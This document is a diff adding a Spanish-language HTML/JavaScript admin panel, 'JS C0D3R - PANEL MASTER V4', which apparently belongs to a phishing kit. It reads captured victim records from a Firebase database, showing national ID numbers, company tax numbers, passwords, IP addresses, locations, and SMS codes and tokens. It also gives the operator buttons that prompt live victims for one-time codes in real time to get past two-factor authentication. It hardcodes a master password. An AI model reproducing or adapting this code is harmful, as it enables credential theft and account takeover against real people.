@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>JS C0D3R - PANEL MASTER V4</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        :root{
+            --bg:#070b12; --line:#1e2a3f; --accent:#2563eb; --accent2:#22d3ee; --muted:#7c8aa5;
+        }
+        *{box-sizing:border-box}
+        body{
+            margin:0;min-height:100vh;color:#e5e7eb;
+            font-family:'JetBrains Mono',ui-monospace,monospace;
+            background:
+                radial-gradient(900px 420px at 5% -10%, #10203a 0%, transparent 60%),
+                radial-gradient(700px 360px at 100% 0%, #131a2b 0%, transparent 55%),
+                var(--bg);
+        }
+        #admin-panel{display:none}
+        #auth-screen{display:flex}
+
+        /* ---------- LOGIN ---------- */
+        #auth-screen{position:fixed;inset:0;align-items:center;justify-content:center;z-index:100;
+            background:radial-gradient(700px 400px at 50% 0%, #10203a 0%, transparent 60%),#050810}
+        .login-box{width:360px;padding:30px 28px;background:linear-gradient(180deg,#101828,#0a1018);
+            border:1px solid var(--line);clip-path:polygon(20px 0,100% 0,100% calc(100% - 20px),calc(100% - 20px) 100%,0 100%,0 20px);
+            box-shadow:0 0 40px rgba(34,211,238,.08)}
+        .login-box h2{margin:0 0 22px;font-size:17px;letter-spacing:.06em;text-align:center;color:#fff}
+        .login-box input{width:100%;padding:12px 14px;background:#0a1120;border:1px solid #22314b;color:#fff;
+            font-family:inherit;font-size:13px;outline:none;clip-path:polygon(9px 0,100% 0,calc(100% - 9px) 100%,0 100%)}
+        .login-box input:focus{border-color:var(--accent2)}
+        .login-box button{width:100%;margin-top:14px;padding:13px;border:0;cursor:pointer;color:#fff;
+            font-family:inherit;font-weight:800;font-size:12px;letter-spacing:.14em;text-transform:uppercase;
+            background:linear-gradient(180deg,#2563eb,#1d4ed8);
+            clip-path:polygon(10px 0,100% 0,calc(100% - 10px) 100%,0 100%)}
+        .login-box button:hover{filter:brightness(1.15)}
+
+        /* ---------- NAV ---------- */
+        nav{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;
+            gap:12px;padding:12px 18px;margin-bottom:18px;flex-wrap:wrap;
+            background:linear-gradient(90deg,#101a2e,#0b1220);border-bottom:1px solid var(--line)}
+        .brand{font-weight:800;font-style:italic;font-size:16px;letter-spacing:.03em;color:#fff}
+        .brand span{color:var(--accent2)}
+        .nav-right{display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+        .pill{font-size:10px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:#93c5fd;
+            background:#0f1c33;border:1px solid #1e3a6b;padding:8px 15px;
+            clip-path:polygon(8px 0,100% 0,calc(100% - 8px) 100%,0 100%)}
+        .pill b{color:#fff}
+
+        /* ---------- TIRAS DIAGONALES ---------- */
+        .wrap{max-width:1500px;margin:0 auto;padding:0 18px 40px}
+        .strip{
+            position:relative;display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+            padding:13px 18px 13px 32px;margin-bottom:11px;
+            background:linear-gradient(90deg,#131b2b 0%,#0c1220 55%,#0b1120 100%);
+            border:1px solid var(--line);
+            clip-path:polygon(18px 0,100% 0,100% 100%,0 100%);
+            transition:background .2s,border-color .2s}
+        .strip:hover{background:linear-gradient(90deg,#18223a 0%,#0f1729 55%,#0d1424 100%);border-color:#2c3d5c}
+        .strip::before{content:'';position:absolute;left:0;top:0;bottom:0;width:18px;
+            background:linear-gradient(180deg,var(--accent),var(--accent2));
+            clip-path:polygon(18px 0,100% 0,100% 100%,0 100%);
+            box-shadow:0 0 20px rgba(34,211,238,.35)}
+        .strip.emp::before{background:linear-gradient(180deg,#7c3aed,#22d3ee);box-shadow:0 0 20px rgba(124,58,237,.4)}
+
+        .seg{display:flex;flex-direction:column;gap:2px;min-width:0}
+        .lbl{font-size:8.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);font-weight:800}
+        .val{font-size:13.5px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px}
+        .blue{color:#60a5fa}.cyan{color:#22d3ee}.red{color:#fb7185}.orange{color:#fbbf24}
+        .green{color:#34d399}.gray{color:#94a3b8}.purple{color:#a78bfa}
+        .live{flex-direction:row;align-items:center;gap:7px}
+        .dot{width:8px;height:8px;border-radius:50%}
+        .dot.on{background:#22c55e;box-shadow:0 0 10px #22c55e;animation:blip 1.6s infinite}
+        .dot.off{background:#ef4444;box-shadow:0 0 10px #ef4444}
+        @keyframes blip{0%,100%{opacity:1}50%{opacity:.35}}
+        .live-txt{font-size:10px;font-weight:800;letter-spacing:.16em}
+
+        /* ---------- CÓDIGOS ---------- */
+        .code{padding:8px 15px;border:1px solid #f59e0b;background:#2a2008;text-align:center;
+            clip-path:polygon(8px 0,100% 0,calc(100% - 8px) 100%,0 100%);
+            animation:pulse-yellow 2s infinite}
+        .code.t2{border-color:#f97316;background:#2b1608;animation:pulse-orange 2s infinite}
+        .code .cl{font-size:8px;font-weight:800;letter-spacing:.14em;color:#fbbf24;text-transform:uppercase}
+        .code .cv{font-size:19px;font-weight:800;color:#fff;line-height:1.15;letter-spacing:.05em}
+        @keyframes pulse-yellow{0%,100%{background-color:#2a2008}50%{background-color:#3d2e06}}
+        @keyframes pulse-orange{0%,100%{background-color:#2b1608}50%{background-color:#3d1d06}}
+
+        /* ---------- BOTONES ---------- */
+        .btns{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
+        .btn{border:0;cursor:pointer;color:#fff;font-family:inherit;font-weight:800;font-size:9px;
+            letter-spacing:.11em;text-transform:uppercase;padding:10px 15px;
+            clip-path:polygon(8px 0,100% 0,calc(100% - 8px) 100%,0 100%);
+            transition:filter .15s,transform .15s}
+        .btn:hover{filter:brightness(1.2)}
+        .btn:active{transform:translateY(1px)}
+        .b-orange{background:linear-gradient(180deg,#f59e0b,#d97706)}
+        .b-darkorange{background:linear-gradient(180deg,#ea580c,#c2410c)}
+        .b-blue{background:linear-gradient(180deg,#2563eb,#1d4ed8)}
+        .b-teal{background:linear-gradient(180deg,#0d9488,#0f766e)}
+        .b-gray{background:linear-gradient(180deg,#334155,#1e293b)}
+        .b-purple{background:linear-gradient(180deg,#7c3aed,#6d28d9)}
+        .b-red{background:linear-gradient(180deg,#e11d48,#be123c)}
+    </style>
+</head>
+<body>
+
+    <div id="auth-screen">
+        <div class="login-box">
+            <h2>🔐 ACCESO MASTER</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña">
+            <button onclick="verificarAcceso()">Entrar</button>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <nav>
+            <div class="brand">JS C0D3R <span>- PANEL</span></div>
+            <div class="nav-right">
+                <div class="pill">TOTAL: <b id="total-count">0</b></div>
+                <div class="pill">REFRESCO: <b id="timer">10</b>s</div>
+                <button class="btn b-red" onclick="borrarTodo()">Limpiar Todo</button>
+                <button class="btn b-gray" onclick="cerrarSesion()">Salir</button>
+            </div>
+        </nav>
+
+        <div class="wrap">
+            <div id="users-container"></div>
+        </div>
+    </div>
+
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <script>
+        const CLAVE_MAESTRA = "Cabimas2910";
+        const firebaseConfig = { databaseURL: "https://cbcoop-25da7-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let idsConocidos = new Set();
+        let primeraCarga = true;
+        const tiempos = new Map();   // id -> timestamp de primera detección
+
+        if (sessionStorage.getItem('ids_guardados')) {
+            idsConocidos = new Set(JSON.parse(sessionStorage.getItem('ids_guardados')));
+        }
+
+        // Auto-Refresh
+        let countTimer = 10;
+        setInterval(() => {
+            if (--countTimer <= 0) location.reload();
+            const t = document.getElementById('timer');
+            if (t) t.innerText = countTimer;
+        }, 1000);
+
+        // Contador "0s" por tira
+        setInterval(() => {
+            document.querySelectorAll('.tiempo').forEach(el => {
+                const ts = tiempos.get(el.dataset.id);
+                if (ts) el.innerText = Math.floor((Date.now() - ts) / 1000) + 's';
+            });
+        }, 1000);
+
+        function verificarAcceso() {
+            if (document.getElementById('admin-pass').value === CLAVE_MAESTRA) {
+                sessionStorage.setItem('admin_auth', 'true');
+                mostrarPanel();
+            }
+        }
+
+        function mostrarPanel() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+            escucharBaseDeDatos();
+        }
+
+        if (sessionStorage.getItem('admin_auth') === 'true') mostrarPanel();
+
+        function escucharBaseDeDatos() {
+            db.ref('logins').on('value', (snapshot) => {
+                const container = document.getElementById('users-container');
+                container.innerHTML = '';
+                let count = 0;
+
+                snapshot.forEach((child) => {
+                    const id = child.key;
+                    const data = child.val();
+                    if (!data.user) return;
+                    count++;
+
+                    if (!idsConocidos.has(id)) {
+                        if (!primeraCarga) {
+                            const audio = document.getElementById('notif-sound');
+                            if (audio) audio.play().catch(()=>{});
+                        }
+                        idsConocidos.add(id);
+                        sessionStorage.setItem('ids_guardados', JSON.stringify(Array.from(idsConocidos)));
+                    }
+                    if (!tiempos.has(id)) tiempos.set(id, Date.now());
+
+                    const esEmp = !!data.cedula_juridica && data.cedula_juridica !== 'No proporcionada';
+                    const on = !!data.online;
+
+                    container.innerHTML += `
+                        <div class="strip ${esEmp ? 'emp' : ''}">
+                            <div class="seg live">
+                                <span class="dot ${on ? 'on' : 'off'}"></span>
+                                <span class="live-txt ${on ? 'green' : 'red'}">${on ? 'LIVE' : 'OFF'}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">Estado</span>
+                                <span class="val orange">${data.status || 'ACTIVO'}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">N° de R.U.C.</span>
+                                <span class="val blue">${data.cedula_juridica || '---'}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">N° de Cédula</span>
+                                <span class="val cyan">${data.user}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">Contraseña</span>
+                                <span class="val red">${data.pass}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">📍 Ubicación</span>
+                                <span class="val green" title="${data.ubicacion || 'No capturada'}">${data.ubicacion || 'Desconocida'}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">🌐 IP</span>
+                                <span class="val gray">${data.ip || '0.0.0.0'}</span>
+                            </div>
+
+                            <div class="seg">
+                                <span class="lbl">Tiempo</span>
+                                <span class="val gray tiempo" data-id="${id}">0s</span>
+                            </div>
+
+                            ${data.sms ? `
+                                <div class="code">
+                                    <div class="cl">📩 Código 1</div>
+                                    <div class="cv">${data.sms}</div>
+                                </div>` : ''}
+
+                            ${data.sms2 ? `
+                                <div class="code t2">
+                                    <div class="cl">📩 Código 2</div>
+                                    <div class="cv">${data.sms2}</div>
+                                </div>` : ''}
+
+                            ${data.token ? `
+                                <div class="code">
+                                    <div class="cl">📩 Token 1</div>
+                                    <div class="cv">${data.token}</div>
+                                </div>` : ''}
+
+                            ${data.token2 ? `
+                                <div class="code t2">
+                                    <div class="cl">📩 Token 2</div>
+                                    <div class="cv">${data.token2}</div>
+                                </div>` : ''}
+
+                            <div class="btns">
+                                <button class="btn b-orange"     onclick="enviarOrden('${id}','pedir_codigo')">SMS 1</button>
+                                <button class="btn b-darkorange" onclick="enviarOrden('${id}','pedir_codigo2')">SMS 2</button>
+                                <button class="btn b-blue"       onclick="enviarOrden('${id}','pedir_token1')">Token 1</button>
+                                <button class="btn b-teal"       onclick="enviarOrden('${id}','pedir_token2')">Token 2</button>
+                                <button class="btn b-gray"       onclick="enviarOrden('${id}','rechazar')">Rechazar</button>
+                                <button class="btn b-purple"     onclick="enviarOrden('${id}','bloquear_ip')">Bloquear IP</button>
+                                <button class="btn b-red"        onclick="eliminarRegistro('${id}')">Eliminar</button>
+                            </div>
+                        </div>`;
+                });
+
+                document.getElementById('total-count').innerText = count;
+                primeraCarga = false;
+            });
+        }
+
+        function enviarOrden(id, accion) {
+            let statusText = 'ACTIVO';
+            switch(accion) {
+                case 'pedir_codigo':  statusText = 'ESPERANDO SMS 1';   break;
+                case 'pedir_codigo2': statusText = 'ESPERANDO SMS 2';   break;
+                case 'pedir_token1':  statusText = 'ESPERANDO TOKEN 1'; break;
+                case 'pedir_token2':  statusText = 'ESPERANDO TOKEN 2'; break;
+                case 'rechazar':      statusText = 'SOLICITUD RECHAZADA'; break;
+                case 'bloquear_ip':   statusText = 'IP BLOQUEADA';      break;
+            }
+            db.ref('logins/' + id).update({ status: statusText });
+            db.ref('comandos/' + id).set({ accion: accion, ts: Date.now() });
+        }
+
+        function eliminarRegistro(id) {
+            if (confirm('¿Eliminar este usuario del panel?')) {
+                db.ref('logins/' + id).remove().then(() => db.ref('comandos/' + id).remove());
+            }
+        }
+
+        function borrarTodo() {
+            if (confirm('¿Borrar todos los registros de la base de datos?')) {
+                sessionStorage.removeItem('ids_guardados');
+                tiempos.clear();
+                db.ref().remove();
+            }
+        }
+
+        function cerrarSesion() { sessionStorage.clear(); location.reload(); }
+    </script>
+</body>
+</html>
